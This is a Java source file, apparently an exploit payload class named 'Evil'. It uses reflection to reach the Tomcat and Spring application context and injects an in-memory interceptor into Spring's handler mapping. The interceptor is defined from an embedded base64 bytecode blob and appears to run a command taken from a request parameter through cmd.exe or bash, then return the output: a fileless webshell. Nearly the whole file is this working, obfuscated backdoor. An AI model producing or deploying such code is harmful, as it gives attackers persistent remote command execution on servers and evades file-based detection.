package artsploit;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class Evil {
    public Evil() throws Exception {
        // 从当前线程取出上下文，适用于多线程情况 -> 会报奇怪的错，还是反射调用吧
        // Context tomcatEmbeddedContext = ((TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader()).getResources().getContext();
        ClassLoader tomcatClassLoader = Thread.currentThread().getContextClassLoader();
        Method getResources = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getMethod("getResources");


        Object resources = getResources.invoke(tomcatClassLoader);
        Method getContext = getResources.invoke(tomcatClassLoader).getClass().getMethod("getContext");
        Object tomcatEmbeddedContext = (Object) getContext.invoke(resources);


        // 取出 ApplicationContext
        Field contextField = getContext.invoke(resources).getClass().getSuperclass().getDeclaredField("context");
        contextField.setAccessible(true);

        Object applicationContext = (Object) contextField.get(tomcatEmbeddedContext);
        Method getAttribute = contextField.get(tomcatEmbeddedContext).getClass().getMethod("getAttribute", String.class);

        Object webApplicationContext = (Object) getAttribute.invoke(applicationContext, "org.springframework.web.context.WebApplicationContext.ROOT");
        Class<?> abstractApplicationContext = getAttribute.invoke(applicationContext, "org.springframework.web.context.WebApplicationContext.ROOT").getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();


        Method getBean = abstractApplicationContext.getMethod("getBean", String.class);
        Method getBeanDefinitionNames = abstractApplicationContext.getMethod("getBeanDefinitionNames");

        // 测试输出所有 Bean 成功
//            Object[] result = (Object[]) getBeanDefinitionNames.invoke(webApplicationContext);
//            for(Object r:result){
//                System.out.println(r.toString());
//            }

        // 单例模式，不能用 getBean -> SingletonObjects
        Object abstractHandlerMapping = getBean.invoke(webApplicationContext, "requestMappingHandlerMapping");
        // 反射获取adaptedInterceptors属性
        Field field = getBean.invoke(webApplicationContext, "requestMappingHandlerMapping").getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("adaptedInterceptors");

        field.setAccessible(true);
        System.out.println("1ok");
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);
        for (Object i : adaptedInterceptors) {
            if (i.getClass().getName().contains("Madao")) {
                return;
            }
        }

        // 获取主线程的类加载器
        Method getParentCLassLoader = getContext.invoke(resources).getClass().getMethod("getParentClassLoader");
        ClassLoader parentClassLoader = (ClassLoader) getParentCLassLoader.invoke(tomcatEmbeddedContext);
        Class<?> madaoClass = defineClass(parentClassLoader, "yv66vgAAADQAlQoAIgBICABJCwBKAEsIAEwKAE0ATgoACgBPCABQCgAKAFEKAFIAUwcAVAgAVQgAVgoAUgBXCABYCABZBwBaBwBbCgBcAF0KABEAXgoAEABfBwBgCgAVAEgKABAAYQoAFQBiCgAVAGMKABUAZAsAZQBmCgAKAGcKAGgAaQoAaABqCgBoAGsLAGUAbAcAbQcAbgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQARTGFydHNwbG9pdC9NYWRhbzsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAEbGluZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA2NtZAEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQANU3RhY2tNYXBUYWJsZQcAVAcAbwcAWgcAYAcAbQcAcAcAcQcAcgEACkV4Y2VwdGlvbnMHAHMBAApTb3VyY2VGaWxlAQAKTWFkYW8uamF2YQwAIwAkAQAGcGFzc2VyBwBwDAB0AHUBAAdvcy5uYW1lBwB2DAB3AHUMAHgAeQEAA3dpbgwAegB7BwB8DAB9AH4BABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAB/AIABAARiYXNoAQACLWMBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcAbwwAgQCCDAAjAIMMACMAhAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDACFAHkMAIYAhwwAhgCIDACJAHkHAHEMAIoAiwwAjACNBwCODACPAJAMAJEAJAwAkgAkDACTAJQBAA9hcnRzcGxvaXQvTWFkYW8BAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAEWphdmEvbGFuZy9Qcm9jZXNzAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAHChDKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAD2dldE91dHB1dFN0cmVhbQEAJSgpTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBAAhnZXRCeXRlcwEABCgpW0IBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW0BAAV3cml0ZQEABShbQilWAQAFZmx1c2gBAAVjbG9zZQEACXNlbmRFcnJvcgEABChJKVYAIQAhACIAAAAAAAIAAQAjACQAAQAlAAAALwABAAEAAAAFKrcAAbEAAAACACYAAAAGAAEAAAAKACcAAAAMAAEAAAAFACgAKQAAAAEAKgArAAIAJQAAAd0ABQAJAAAA3CsSArkAAwIAxgDSKxICuQADAgA6BBkExgC4EgS4AAW2AAYSB7YACJkAIbgACQa9AApZAxILU1kEEgxTWQUZBFO2AA06BacAHrgACQa9AApZAxIOU1kEEg9TWQUZBFO2AA06BbsAEFm7ABFZGQW2ABK3ABO3ABQ6BrsAFVm3ABY6BxkGtgAXWToIxgAgGQe7ABVZtwAWGQi2ABgQCrYAGbYAGrYAGFen/9ssuQAbAQAZB7YAGrYAHLYAHSy5ABsBALYAHiy5ABsBALYAH6cADCwRAZS5ACACAAOsBKwAAAADACYAAABGABEAAAAMAAsADQAVAA4AGgAQACoAEQBIABMAYwAWAHgAFwCBABoAjAAbAKkAHgC6AB8AwwAgAMwAIQDPACIA2AAkANoAJgAnAAAAZgAKAEUAAwAsAC0ABQBjAGkALAAtAAUAeABUAC4ALwAGAIEASwAwADEABwCJAEMAMgAzAAgAFQDFADQAMwAEAAAA3AAoACkAAAAAANwANQA2AAEAAADcADcAOAACAAAA3AA5ADoAAwA7AAAANwAH/ABIBwA8/AAaBwA9/QAdBwA+BwA//AAnBwA8/wAlAAUHAEAHAEEHAEIHAEMHADwAAAj6AAEARAAAAAQAAQBFAAEARgAAAAIARw==");
        adaptedInterceptors.add(madaoClass.newInstance());
    }

    public static Class defineClass(ClassLoader classLoader, String classByte) throws Exception {
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
        defineClass.setAccessible(true);
        byte[] evalBytes = Base64.getDecoder().decode(classByte);
        return (Class<?>) defineClass.invoke(classLoader, new Object[]{evalBytes, 0, evalBytes.length});
    }
}
